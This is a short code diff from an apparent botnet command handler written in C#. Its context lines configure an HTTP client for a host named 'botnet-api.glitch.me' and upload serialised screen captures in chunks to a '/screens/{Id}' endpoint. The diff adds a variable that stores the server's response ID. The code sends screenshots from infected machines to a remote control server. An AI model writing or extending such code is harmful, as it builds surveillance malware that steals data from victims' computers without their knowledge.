@@ -101,6 +101,7 @@ namespace CommandHandler
             client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
             List<byte[]> btlist = new List<byte[]>();
             int value = 0;
+            string sid;
             HttpResponseMessage respgl = null;
             for (int i = 0; i < (bt.Length/20000)+1; i++)
 			{
@@ -126,6 +127,7 @@ namespace CommandHandler
                     string json = new JavaScriptSerializer().Serialize(screen);
                     respgl = await client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json));
                     respgl.EnsureSuccessStatusCode();
+                    sid = respgl.Content.ReadAsStringAsync().Result;
 	            }
                 else
 	            {
